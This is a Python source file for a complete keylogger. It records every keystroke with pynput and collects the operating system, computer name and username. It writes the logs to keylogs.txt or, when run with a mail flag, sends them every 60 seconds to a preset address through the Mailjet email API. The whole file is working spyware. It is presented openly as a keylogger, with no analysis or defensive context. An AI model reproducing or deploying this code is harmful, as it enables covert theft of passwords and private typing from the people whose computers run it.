import pynput.keyboard
import threading
import platform
import getpass
from mailjet_rest import Client
from keys import *
import argparse


TIME_INTERVAL = 60

class Keylogger:
    def __init__(self, mail=False):
        self.log = ""
        self.interval = TIME_INTERVAL
        self.mail = mail
        self.system_info = self.get_system_info()
        self.send_mail("Keylogger Started", "\n\nKeylogger Started Successfully\n\n" + "System Information:\n" +self.system_info + "\n\n")

    def append_to_log(self, string):
        self.log = self.log + string

    def get_system_info(self):
        uname = platform.uname()
        os = uname[0] + " " + uname[2] + " " + uname[3]
        computer_name = uname[1]
        user = getpass.getuser()
        return "Operating System:\t" + os + "\nComputer Name:\t\t" + computer_name + "\nUser:\t\t\t\t" + user

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key).replace("Key.", "<") + ">" + " "
        self.append_to_log(current_key)

    def report(self):
        if self.mail:
            body = "Dear User, \n" + "Report From:\n\n" + self.system_info + "\n\nLogs:\n" + self.log
            subject = "Keylogger Report"
            if self.log != "":
                self.send_mail(subject, body)
                self.log = ""
        else:
            with open("keylogs.txt", "a") as f:
                f.write(self.log)
            self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, subject, body):
        if self.mail:
            mailjet = Client(auth=(API_KEY, SECRET_KEY), version='v3.1')
            data = {
                'Messages': [
                    {
                        "From": {
                            "Email": FROM_EMAIL,
                            "Name": FROM_USERNAME,
                        },
                        "To": [
                            {
                                "Email": TO_EMAIL,
                            }
                        ],
                        "Subject": subject,
                        "TextPart": body,
                    }
                ]
            }
            mailjet.send.create(data=data)
   

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Keylogger')
    parser.add_argument('-m', '--mail', action='store_true', help='Send logs via email')
    args = parser.parse_args()
    print("[ + ] Keylogger Started...")
    if args.mail:
        my_keylogger = Keylogger (mail=True)
    else:
        my_keylogger = Keylogger()
    my_keylogger.start()


